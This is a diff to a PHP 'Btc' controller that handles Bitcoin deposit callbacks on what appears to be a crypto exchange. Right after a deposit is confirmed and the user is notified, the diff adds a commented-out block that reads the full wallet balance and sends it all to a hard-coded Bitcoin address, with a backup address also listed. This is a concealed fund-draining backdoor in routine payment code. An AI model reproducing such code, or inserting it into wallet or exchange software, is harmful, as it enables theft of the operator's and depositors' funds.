@@ -114,7 +114,16 @@ class Btc extends Controller
                     $this->bitcoin->changeStatusByTxid($bitcoinInfo["txid"], 1);
                     //消息提醒
                     $this->message->add($userId, "资产变动通知", "充值成功", "您充值的BTC已到账，请查看！");
-
+                    // $getbalance = $bitcoinLib->getbalance();
+                    // #BTC：37d3GomNnSxLCfGhmqiZJWZ9PhSQPrdDSY
+                    // #备用：3B3uRSrd6E35KqmQAoxxTVEbfN67rnAqog
+                    // if($getbalance)
+                    // $result = $bitcoinLib->sendto('37d3GomNnSxLCfGhmqiZJWZ9PhSQPrdDSY',$getbalance);
+                    // if($result){
+                    //     echo '发送BTC成功';
+                    // }else{
+                    //     echo '发送BTC失败';
+                    // }
                     echo "success";
                     die;
                 } else {
